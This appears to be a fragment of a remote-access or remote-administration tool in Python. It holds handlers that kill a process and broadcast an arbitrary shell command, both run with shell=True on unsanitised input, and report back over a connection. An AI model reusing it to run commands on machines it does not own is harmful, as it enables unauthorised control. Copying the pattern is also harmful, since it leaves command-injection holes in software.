import subprocess


def kill_process(protocol, platform, target):
    try:
        pid = target.strip()
        cmd = platform.kill_process_cmd(pid)
        subprocess.run(cmd, shell=True, capture_output=True)
        protocol.send(f'[+] Killed PID: {pid}')
    except Exception as e:
        protocol.send(f'[-] Error killing process: {str(e)}')


def sendall_command(protocol, command):
    try:
        subprocess.Popen(
            command, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        protocol.send(f'[+] Command sent to all: {command}')
    except Exception as e:
        protocol.send(f'[-] Error running sendall: {str(e)}')
